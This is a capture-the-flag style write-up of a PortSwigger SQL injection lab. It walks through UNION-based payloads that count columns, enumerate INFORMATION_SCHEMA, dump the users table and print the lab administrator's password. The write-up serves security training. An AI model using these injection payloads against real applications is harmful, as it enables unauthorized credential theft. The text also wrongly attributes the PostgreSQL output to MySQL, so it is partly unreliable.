# SQL injection UNION attack, retrieving data from other tables.

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

---

## Lab

https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

---

## OWASP Category

SQLi-UNION

---

## Prerequites

SQL quary use in this lab refence from **MySQL documantation**. You can refer that documantation for **more information** and **understanding**.

[**MySQL documantation**](https://dev.mysql.com/doc/refman/9.7/en/information-schema.html).

---

## Steps to Solve

**Step 1 — Parameter finding**

First we open one catagory. For example, **Gift** in our example.


<img width="832" height="40" alt="image" src="https://github.com/user-attachments/assets/31797c9a-32ed-4f0d-81b1-fc3af8e74fe5" />

After this we need to check whole database structure like metadata of database.
---

**Step 2 — Find Number of columns**

First we inject SQLi quary to to **catagory parameter** for try to check number of columns.

We found 2 columns by quary **' union select null,null--**
```http
' union select null,null--
```

<img width="1505" height="447" alt="image" src="https://github.com/user-attachments/assets/80ed0a54-7610-4da8-8516-01c604e256af" />

Now we need to check which data type compitable with that columns and accept by databse.

We found **string data type** accept by database.

<img width="1106" height="637" alt="image" src="https://github.com/user-attachments/assets/1be6e86c-87b1-47c5-967b-0284e076e9c7" />

Now we can enter some quary in this columns and retrieve interesting data.

---

**Step 3 — Gathering interesting data** **[From this step can refer MySQL link given in Prerequites.]**

**1. Check **SCHEMATA(databases available in DBMS)** in this DBMS.**

   for that we can use this quary :
   ```http
   ' UNION select schema_name,null from INFORMATION_SCHEMA.SCHEMATA-- -
   ```
   We found interesting data saw in below snapshot.

   <img width="1252" height="612" alt="image" src="https://github.com/user-attachments/assets/6670a590-285a-4621-ac64-5b2f83150ad4" />

   But we see that three name saw there **public, information_schema, pg_catalog**. information_schema is default by MySQL have metadat of DBMS.
   May be **public and pg_catalog** have interesting data. We check first **public**.

**2. Check public databse.**
   We can use this quary for retreive data like tables inside that:
   ```http
   ' UNION select TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='public'-- -
   ```

   <img width="1358" height="687" alt="image" src="https://github.com/user-attachments/assets/09c187c8-d5a8-47d3-85c3-87aed53a5b67" />

   Found it named **users**.

**3. Now go with users table and find columns in that.**

   ```http
   ' UNION select COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
   ```

   <img width="1360" height="803" alt="image" src="https://github.com/user-attachments/assets/223fdac6-686a-416f-93cf-169cdce5116f" />

   Something more interesting Columns name with **email,username and password**.

**4. Atlast we can retrive sensitive data from this table.**

   Just enter this quary:
   ```http
   ' UNION select username, password from public.users-- -
   ```
   
   <img width="1393" height="689" alt="image" src="https://github.com/user-attachments/assets/a3662494-6f97-4a3e-adcc-a55f4c06f211" />

   Found it:
   ```http
   administrator
   68qq0imijycrg5tf6rdd
   ```
   **By this way we can retreive the metadata and find the sensitive data from databse.**
---

**Lab Solved**

<img width="1544" height="740" alt="image" src="https://github.com/user-attachments/assets/e2c7f9f8-5ed9-4529-a79d-dfb529ca8264" />

---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
